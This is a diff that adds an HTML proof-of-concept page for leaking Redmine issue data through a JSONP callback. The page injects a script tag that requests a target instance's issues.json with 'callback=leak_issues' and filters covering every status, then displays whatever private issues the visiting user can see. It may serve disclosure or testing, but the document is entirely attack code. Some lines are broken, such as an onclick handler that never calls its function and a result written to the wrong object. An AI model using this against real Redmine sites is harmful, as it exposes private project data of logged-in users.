@@ -1,0 +1,17 @@
+<!doctype html>
+<script>
+var leak = function(){
+  x = document.createElement('script')
+  x.src=document.getElementById('base').value+"/issues.json?callback=leak_issues&set_filter=1&f%5B%5D=status_id&op%5Bstatus_id%5D=*&f%5B%5D=&c%5B%5D=tracker&c%5B%5D=status&c%5B%5D=subject&c%5B%5D=updated_on&c%5B%5D=category"
+  document.appendChild(x)
+}
+var leak_issues = function(g){
+  alert('alright!')
+  document.getElementById.innerHTML = JSON.stringify(g)
+}
+</script>
+<input id="base" name="base" placeholder="redmine URL, e.g. http://www.redmine.org">
+<input type="submit" onclick="leak">
+<br />
+<div id="result">
+</div>
